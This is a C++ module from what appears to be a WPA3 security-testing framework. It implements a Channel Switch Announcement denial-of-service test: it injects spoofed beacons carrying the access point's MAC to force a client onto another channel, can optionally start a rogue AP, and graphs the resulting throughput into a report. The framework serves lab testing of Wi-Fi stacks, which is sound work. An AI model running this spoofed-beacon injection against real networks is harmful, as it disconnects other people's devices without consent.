#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include "logger/error_log.h"
#include <cassert>
#include "ex_program/hostapd/hostapd.h"
#include "logger/log.h"
#include <thread>
#include <chrono>
#include "system/hw_capabilities.h"
#include <filesystem>

#include "attacks/components/setup_connections.h"
#include "ex_program/external_actors/ExternalConn.h"
#include "logger/report.h"
#include "observer/mausezahn_wrapper.h"
#include "observer/observers.h"
#include "observer/tcpdump_wrapper.h"
#include "observer/tshark_wrapper.h"
#include "setup/program.h"

namespace wpa3_tester::CSA_attack{
    using namespace std;
    using namespace filesystem;
    using namespace Tins;
    using namespace chrono;

    void send_CSA_beacon(const HWAddress<6> &ap_mac,
                         const NetworkInterface &iface,
                         const string &ssid,
                         const int ap_channel,
                         const int new_channel) {

        Dot11Beacon beacon;
        beacon.addr1(Dot11::BROADCAST);
        beacon.addr2(ap_mac);
        beacon.addr3(ap_mac);
        beacon.ssid(ssid);
        beacon.ds_parameter_set(ap_channel);

        Dot11ManagementFrame::channel_switch_type cs;
        cs.switch_mode = 1;
        cs.new_channel = new_channel;
        cs.switch_count = 3;
        beacon.channel_switch(cs);

        RadioTap radiotap;
        const int freq_mhz = hw_capabilities::channel_to_freq(ap_channel);
        radiotap.channel(freq_mhz, RadioTap::OFDM);
        radiotap.inner_pdu(beacon);

        PacketSender sender;
        sender.send(radiotap, iface);
    }

    auto check_vulnerable(
        const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac,
        const string &iface_name, const string &ssid,
        const int ap_channel, const int new_channel,
        const int ms_interval,const int attack_time)->void{

        const NetworkInterface iface(iface_name);
        const auto end_time =  steady_clock::now() + seconds(attack_time);

        while (steady_clock::now() < end_time) {
            send_CSA_beacon(ap_mac, iface, ssid, ap_channel, new_channel);
            this_thread::sleep_for(milliseconds(ms_interval));
        }

        cout << "check_vulnerable called with:\n"
                  << "AP MAC: " << ap_mac << "\n"
                  << "STA MAC: " << sta_mac << "\n"
                  << "Interface: " << iface_name << "\n"
                  << "Channel: " << ap_channel << "\n"
                  << "SSID: " << ssid << endl;
    }

    void speed_observation_start(RunStatus& rs){
        observer::start_musezahn(rs, "mz_gen", "client", "access_point");
        observer::start_tshark(rs, "client", "udp port 5201");
        observer::start_tcpdump(rs, "access_point", "udp port 5201");
    }

    // ----------------- MODULE functions ------------------
    void setup_chs_attack(RunStatus& rs){
        if(rs.config.at("actors").contains("rogue_ap")){
            program::start(rs, "rogue_ap");
            rs.process_manager.wait_for("rogue_ap", "AP-ENABLED", seconds(30));
            log(LogLevel::INFO, "Rogue AP up");
        }
        components::client_ap_attacker_setup(rs);
    }

    void run_chs_attack(RunStatus& rs){
        const auto& att_cfg = rs.config.at("attack_config");
        const auto& ap_actor= rs.get_actor("access_point");

        const HWAddress<6> ap_mac(rs.get_actor("access_point")["mac"]);
        const HWAddress<6> sta_mac(rs.get_actor("client")["mac"]);
        const string iface_name = rs.get_actor("attacker")["iface"];
        const string essid     = ap_actor["ssid"];
        const int old_channel  = stoi(ap_actor["channel"]);
        const int new_channel  = att_cfg.at("new_channel");
        const int ms_interval  = att_cfg.at("ms_interval");
        const int attack_time  = att_cfg.at("attack_time");

        speed_observation_start(rs);
        this_thread::sleep_for(seconds(10));
        log(LogLevel::INFO, "Attack START");
        check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel, ms_interval, attack_time);
        log(LogLevel::INFO, "Attack END");
        this_thread::sleep_for(seconds(10));
    }

    // ---------- STATS ----------------
    void generate_report(const RunStatus & rs, const string & STA_graph_path, const string & AP_graph_path){
        const path report_path = path(rs.run_folder) / "report.md";
        std::ofstream report(report_path);
        if (!report.is_open()){ log(LogLevel::ERROR, "Failed to create report file!"); return; }

        report << "# WPA3 Security Test Report: CSA DoS Attack\n\n";
        report << "## Attack Description\n";
        report << "Channel switch announcement will change channel of station, station will disconnect\n\n";
        report::attack_config_table(report, rs);
        report::attack_mapping_table(report, rs);
        report << "## Traffic Analysis\n";
        report << "Charts represent the network speed captured during the test. (STA->AP)\n";
        report << "Successful CSA attack is characterized by sharp drop in received packets on the AP side as the client switches channels.\n";
        report << "### STA (client, wpa_supplicant "<<  rs.config.at("actors").at("client").at("setup").at("program_config").value("version", "default") <<")\n";
        report << "![STA Throughput Graph](" << relative(STA_graph_path, rs.run_folder).string() << ")\n\n";
        report << "### AP (access_point, hostapd " << rs.config.at("actors").at("client").at("setup").at("program_config").value("version", "default") << ")\n";
        report << "![AP Throughput Graph](" << relative(AP_graph_path, rs.run_folder).string() << ")\n\n";
        report << "---\n";
        report.close();
    }

    void stats_chs_attack(const RunStatus &rs){
        log(LogLevel::INFO , "CSA attack stats");
        const vector<LogTimePoint> switch_events = get_time_logs(rs, "client", "CTRL-EVENT-STARTED-CHANNEL-SWITCH");
        const vector<LogTimePoint> disconn_events = get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED");
        const vector<LogTimePoint> eapol_hs_events = get_time_logs(rs, "access_point", "EAPOL-4WAY-HS-COMPLETED");

        vector<observer::graph_lines> events;
        events.push_back({switch_events,"SWITCH","blue"});
        events.push_back({disconn_events,"DISCONN","red"});
        events.push_back({eapol_hs_events,"4Way","green"});
        events.push_back({get_time_logs(rs, "client", "@START"),"START","black"});
        events.push_back({get_time_logs(rs, "client", "@END"),"END","black"});

        if(rs.config.at("actors").contains("rogue_ap")){
            events.push_back({get_time_logs(rs,"rogue_ap","Captured a WPA"),"MANA","black"});
        }

        const string STA_graph_path = observer::tshark_graph(rs, "client", events);
        const string AP_graph_path = observer::tshark_graph(rs, "access_point", events, observer::get_observer_folder(rs, "tcpdump"));
        generate_report(rs, STA_graph_path, AP_graph_path);
    }
}
